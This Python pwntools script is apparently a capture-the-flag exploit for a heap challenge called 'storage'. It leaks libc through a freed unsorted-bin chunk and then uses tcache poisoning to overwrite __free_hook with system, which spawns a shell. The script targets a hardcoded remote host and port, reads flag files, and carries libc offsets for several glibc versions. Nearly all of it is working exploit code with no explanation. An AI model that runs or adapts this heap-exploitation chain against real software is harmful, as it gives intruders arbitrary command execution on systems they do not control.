#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = []


def init():
    '''
    sla("shell(0)<", "SPAWN")
    ru(" Enter process name")
    sla("shell(0)<", "cat")
    sla("shell(0)<", "")
    sla("shell(0)<", "")
    sla("cat(1)<", "/proc/self/maps")
    sla("shell(0)<", "")
    sla("shell(0)<", "")
    sla("shell(0)<", "")
    ru("cat(1)> ")
    pie = int(re(12, 2), 16)
    slog['pie'] = pie
    '''
    
    sla("shell(0)<", "SPAWN")
    ru(" Enter process name")
    sla("shell(0)<", "storage")
    sla("shell(0)<", "EXIT")

def add(idx, size):
    sla(")< ", "1")
    sla(")< ", str(idx))
    sla(")< ", str(size))

def dele(idx):
    sla(")< ", "2")
    sla(")< ", str(idx))

def show(idx):
    sla(")< ", "4")
    sla(")< ", str(idx))

def edit(idx, data):
    sla(")< ", "3")
    sla(")< ", str(idx))
    sla(")< ", data)

def exp():
    init()
    add(0, 0x500)
    add(1, 0x20)
    dele(0)
    show(0)
    ru(")> ")
    leak = u64(re(8, 2))
    slog['leak'] = leak
    main_arean = leak - 96
    malloc_hook = main_arean - 0x10
    slog['mhook'] = malloc_hook
    
    libc = malloc_hook - pmhook
    puts = libc + pputs
    system = libc + psystem
    fhook = libc  + pfhook
    
    add(3, 0x40)
    edit(3, '/bin/sh\x00')

    dele(1)
    edit(1, flat(fhook))
    show(1)
    add(1, 0x20)
    add(2, 0x20)
    edit(2, flat(system))

    dele(3)
    sl("cat flag.txt")
    sl("cat bTAkUG9eCMgCbGMQbx8a")



context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("109.233.61.10", 11710)

libc29 = 0
if libc29:
    pmhook = 0x0000000001e4c30
    pputs  = 0x0000000000083cc0
    pfhook = 0x00000000001e75a8


libc_28_10 = 0
if libc_28_10:
    pmhook = 0x00000000001bbc30
    pputs  = 0x0000000000071910
    pfhook = 0x0000000001bd8e8

libc_28_1 = 0
if libc_28_1:
    pmhook = 0x00000000001e4c30
    pputs  = 0x0000000000081010
    pfhook = 0x00000000001e68e8


libc271 = 0
if libc271:
    pmhook = 0x0000000003ebc30
    pputs  = 0x00000000000809c0
    pfhook = 0x00000000003ed8e8

libc2714 = 1
if libc2714:
    pmhook = 0x00000000003ebc30
    pputs  = 0x000000000080aa0
    pfhook = 0x00000000003ed8e8
    psystem = 0x04f550



def gdba():
    if local == 0:
        return 0;
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base =int(os.popen("pmap {}|grep bin |awk '{{print $1}}'".format(cn.pid)).readlines()[1],16)
        cmd +=''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd +='set $base={:#x}\n'.format(base)
        slog['base'] = base	
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
    gdb.attach(cn,cmd)

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;
from pwnlib.util import cyclic
ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()

slog_show()

ia()

